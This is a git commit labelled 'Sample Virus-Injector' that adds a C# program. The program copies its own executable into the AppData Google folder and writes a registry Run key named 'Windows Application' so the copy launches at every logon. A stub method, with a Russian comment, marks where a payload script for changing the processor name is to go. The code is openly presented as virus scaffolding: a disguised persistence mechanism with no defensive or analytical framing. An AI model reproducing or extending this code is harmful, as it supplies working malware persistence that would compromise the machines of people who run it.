9d37c6955d3e6cfc206e1fed34b9f8cf17614da4
punidev <puni00@yandex.ru>
2016-05-08 18:00:37 +0300

    Sample Virus-Injector

---
+++ reflection/reflection/Program.cs
@@ -0,0 +1,41 @@
+﻿using System;
+using System.IO;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using Microsoft.Win32;
+
+namespace reflection
+{
+    internal class Program
+    {
+        [DllImport("kernel32.dll")]
+        public static extern void ExitProcess([In] uint uExitCode);
+
+        private static void Main()
+        {
+            var fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                "Google",
+                AssemblyProduct);
+            if (!File.Exists(fileName))
+            {
+                File.Copy(AssemblyProduct, fileName); 
+            }
+            var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\");
+            if (key != null) key.SetValue("Windows Application", fileName);
+            Method();
+        }
+        private static void Method()
+        {
+            // сюда кидаем скрипт замены имени процессора 
+            ExitProcess(0);
+        }
+        public static string AssemblyProduct
+        {
+            get
+            {
+                var attributes = Assembly.GetExecutingAssembly().GetCustomAttributes(typeof(AssemblyProductAttribute), false);
+                return attributes.Length == 0 ? "" : ((AssemblyProductAttribute)attributes[0]).Product + ".exe";
+            }
+        }
+    }
+}
